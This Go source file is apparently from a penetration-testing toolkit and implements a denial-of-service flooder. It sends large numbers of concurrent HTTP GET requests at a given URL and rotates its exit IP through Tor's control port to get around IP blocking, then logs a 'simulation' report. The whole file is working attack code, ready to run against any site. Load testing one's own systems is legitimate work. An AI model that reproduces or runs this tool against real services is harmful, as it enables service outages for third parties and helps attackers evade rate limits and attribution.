package ddos

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/KennyZ69/go-aptt/types"
	"github.com/schollz/progressbar/v3"
)

type RequestResult struct {
	Success    bool
	StatusCode int
	RespTime   time.Duration
	Error      error
}

var (
	successfulReq = 0
	failedReq     = 0
	totalReq      = 0
	totalTime     time.Duration
	mu            sync.Mutex
	statusCodes   = make(map[int]int)
)

const (
	torControlAddress = "127.0.0.1:9051"
)

func rotateTorIP(torControlPassword string) {
	conn, err := net.Dial("tcp", torControlAddress)
	if err != nil {
		fmt.Println("Could not connect to the tor control address via tcp: ", err)
		return
	}
	defer conn.Close()

	if torControlPassword != "" {
		fmt.Fprintf(conn, "AUTHENTICATE \"%s\"\n", torControlPassword)
	} else {
		fmt.Fprintln(conn, "AUTHENTICATE \"\"")
	}

	fmt.Fprintln(conn, "SIGNAL NEWNYM")

	status, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil || !strings.Contains(status, "250 OK") {
		log.Printf("Failed to rotate the tor ip: %v: %v\n", err, status)
		return
	}
	// log.Println("Tor ip rotated successfully")
}

func SendReq(wg *sync.WaitGroup, url string) RequestResult {
	defer wg.Done()
	start := time.Now()
	resp, err := http.Get(url)
	elapsed := time.Since(start)

	var result RequestResult

	mu.Lock()
	totalReq++
	totalTime += elapsed

	if err != nil || resp == nil {
		failedReq++
		result = RequestResult{
			Success:    false,
			StatusCode: 0,
			RespTime:   elapsed,
			Error:      err,
		}
	} else if resp.StatusCode != 200 {
		failedReq++
		statusCodes[resp.StatusCode]++
		result = RequestResult{
			Success:    false,
			StatusCode: resp.StatusCode,
			RespTime:   elapsed,
			Error:      err,
		}
		// fmt.Println("Error: DoS_script.go: ", err)
	} else {
		defer resp.Body.Close()
		successfulReq++
		statusCodes[resp.StatusCode]++
		result = RequestResult{
			Success:    true,
			StatusCode: resp.StatusCode,
			RespTime:   elapsed,
			Error:      nil,
		}
	}
	mu.Unlock()
	return result
}

func DosAttack(url string, numRequests, concurrency int, torControlPassword string) {
	log.Println("Starting the DoS attack simulation test on: ", url)
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, concurrency)
	var results []RequestResult

	bar := progressbar.NewOptions(numRequests,
		progressbar.OptionSetDescription("Sending requests..."),
		progressbar.OptionSetWidth(30),
		progressbar.OptionShowCount(),
		progressbar.OptionShowIts(),
		progressbar.OptionSetTheme(progressbar.ThemeASCII),
	)

	for i := 0; i < numRequests; i++ {
		// try to rotate ip addresses for simulating more realistic scenario
		if i%(concurrency/10) == 0 {
			rotateTorIP(torControlPassword)
		}
		wg.Add(1)
		semaphore <- struct{}{} // add an empty struct into the semaphore channel or block it if it is full already so wait till it empties

		go func() {
			defer func() { <-semaphore }() // free up a slot on the semaphore channel
			res := SendReq(&wg, url)
			bar.Add(1)
			results = append(results, res)
		}()
	}

	wg.Wait() // wait for all request to complete

	generateReport(concurrency, url)
}

func generateReport(concurrency int, url string) {
	var avgRespTime time.Duration
	if successfulReq == 0 {
		avgRespTime = time.Duration(0)
	} else {
		avgRespTime = totalTime / time.Duration(successfulReq)
	}
	var failRate float64
	if totalReq == 0 {
		failRate = float64(0)
	} else {
		failRate = float64(failedReq) / float64(totalReq) * 100
	}

	// make the report var for saving into the sim log file
	report := fmt.Sprintf(`
	======== DoS Attack Simulation Report ========
	Total Requests: %d
	Concurrency Level: %d
	Successful Requests: %d
	Failed Requests: %d
	Failure Rate: %.2f%%
	Average Success Response Time: %v
	==============================================
	
	Ran on %v.
`, totalReq, concurrency, successfulReq, failedReq, failRate, avgRespTime, time.Now().Format(time.ANSIC))

	log.Print(report)

	for code, count := range statusCodes {
		fmt.Printf("Status Code %d: %d responses\n", code, count)
	}

	log.Printf("DoS Attack Simulation ended on %s. You can find the saved report in the 'dos_sim_report.log'. \n", url)

	types.SaveReportToFile(report, "dos_sim_report.log")
}
